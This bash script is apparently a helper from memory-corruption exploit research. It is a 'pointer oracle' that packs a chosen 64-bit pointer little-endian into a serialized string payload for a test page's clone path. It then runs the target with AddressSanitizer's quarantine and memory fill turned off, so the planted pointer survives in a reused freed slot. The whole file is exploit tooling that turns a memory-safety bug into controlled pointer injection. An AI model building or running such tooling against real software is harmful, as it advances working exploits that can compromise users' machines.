#!/usr/bin/env bash
# docs/101 pointer oracle: drive caps14's clone arm from a pointer value.
#   usage: poracle.sh <tag> <port> <pointer-hex>
# The slot encoding (docs/94): the stream carries the pointer little-endian at element+8, so `s` is the
# pointer's 8 bytes in hex, and a trailing U+0100 unit forces a 16-bit string (an all-ASCII payload
# serialises 8-bit and shifts the low byte to 0x80).  A representable pointer is 256-aligned.
set -u
TAG=${1:?}; PORT=${2:?}; P=${3:?}
H=$(printf '%016x' "$((P))" 2>/dev/null || echo "")
if [ -z "$H" ]; then echo "bad pointer: $P" >&2; exit 2; fi
# little-endian bytes
LE=""
for i in 14 12 10 8 6 4 2 0; do LE="$LE${H:$i:2}"; done
LOW=${LE:0:2}
if [ "$LOW" != "00" ]; then echo "pointer not 256-aligned (low byte $LOW): $P" >&2; exit 2; fi
S="${LE}0000000000000100"   # 8 units total = 25-byte stream (the docs/94 shape)
ROOT=$(cd "$(dirname "$0")" && pwd)
AO="detect_leaks=0:detect_stack_use_after_return=0:abort_on_error=1:symbolize=1:handle_abort=1:quarantine_size_mb=0:thread_local_quarantine_size_kb=0:max_free_fill_size=0:max_malloc_fill_size=0"
# fill OFF: with the fill on, an allocation after the clone overwrites the slot and every value crashes
bash "$ROOT/oarun.sh" "$TAG" "$PORT" 25 "arm=clone&s=$S" caps14.html "$AO"
